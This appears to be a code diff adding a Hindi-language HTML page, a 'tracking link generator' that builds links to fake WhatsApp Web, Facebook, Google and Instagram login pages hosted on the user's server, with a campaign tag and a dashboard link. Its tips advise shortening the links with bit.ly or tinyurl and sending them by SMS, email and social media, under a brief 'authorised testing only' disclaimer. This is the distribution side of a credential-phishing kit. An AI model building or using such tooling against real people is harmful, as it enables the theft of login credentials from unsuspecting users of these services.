@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>🔗 ट्रैकिंग लिंक जनरेटर</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0f0f23; color: #fff; display: flex;
+            justify-content: center; align-items: center; min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .container {
+            background: #1a1a2e; padding: 40px; border-radius: 15px;
+            width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        h1 { color: #e94560; margin-bottom: 30px; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #aaa; font-size: 13px; }
+        input, select {
+            width: 100%; padding: 12px; background: #16213e; border: 1px solid #333;
+            border-radius: 8px; color: #fff; font-size: 15px;
+        }
+        .url-box {
+            background: #16213e; padding: 15px; border-radius: 8px;
+            margin: 20px 0; word-break: break-all; font-size: 13px;
+            color: #4ecca3; border: 1px solid #333;
+        }
+        .btn {
+            padding: 12px 30px; background: #e94560; color: white;
+            border: none; border-radius: 25px; cursor: pointer; font-size: 15px;
+            margin-right: 10px;
+        }
+        .btn:hover { background: #c73650; }
+        .btn-copy { background: #4ecca3; color: #0f0f23; }
+        .btn-copy:hover { background: #3db88b; }
+        .note {
+            margin-top: 20px; padding: 12px; background: #16213e;
+            border-left: 3px solid #e94560; border-radius: 5px; font-size: 12px; color: #888;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🔗 ट्रैकिंग लिंक जनरेटर</h1>
+    
+    <div class="input-group">
+        <label>आपका सर्वर URL</label>
+        <input type="text" id="serverUrl" value="https://your-domain.com" 
+               placeholder="https://your-server.com">
+    </div>
+    
+    <div class="input-group">
+        <label>फेक पेज चुनें</label>
+        <select id="pageType">
+            <option value="index.html">WhatsApp Web</option>
+            <option value="fake-page.html">Facebook Login</option>
+            <option value="index.html">Google Login</option>
+            <option value="index.html">Instagram Login</option>
+        </select>
+    </div>
+    
+    <div class="input-group">
+        <label>कैम्पेन का नाम (ऑप्शनल)</label>
+        <input type="text" id="campaign" placeholder="जैसे: test_01">
+    </div>
+    
+    <button class="btn" onclick="generateLink()">🔗 लिंक बनाएँ</button>
+    <button class="btn btn-copy" onclick="copyLink()">📋 कॉपी करें</button>
+    
+    <div class="url-box" id="outputLink">
+        यहाँ लिंक दिखेगा...
+    </div>
+    
+    <div class="note">
+        💡 <b>टिप:</b> लिंक को URL शॉर्टनर (bit.ly, tinyurl) से छोटा करें।<br>
+        📱 SMS, ईमेल, सोशल मीडिया के ज़रिए भेजें।<br>
+        ⚠️ केवल अधिकृत टेस्टिंग के लिए।
+    </div>
+</div>
+
+<script>
+function generateLink() {
+    const server = document.getElementById('serverUrl').value;
+    const page = document.getElementById('pageType').value;
+    const campaign = document.getElementById('campaign').value;
+    
+    let link = `${server}/${page}`;
+    if (campaign) {
+        link += `?c=${encodeURIComponent(campaign)}`;
+    }
+    
+    // URL शॉर्टनर सुझाव
+    document.getElementById('outputLink').innerHTML = 
+        `🔗 <b>ट्रैकिंग लिंक:</b><br><br>${link}<br><br>` +
+        `📏 <b>शॉर्ट करें:</b> https://bit.ly/3xample<br><br>` +
+        `📊 <b>डैशबोर्ड:</b> ${server}/dashboard.php`;
+}
+
+function copyLink() {
+    const link = document.getElementById('outputLink').innerText;
+    navigator.clipboard.writeText(link).then(() => {
+        alert('✅ लिंक कॉपी हो गया!');
+    });
+}
+</script>
+</body>
+</html>
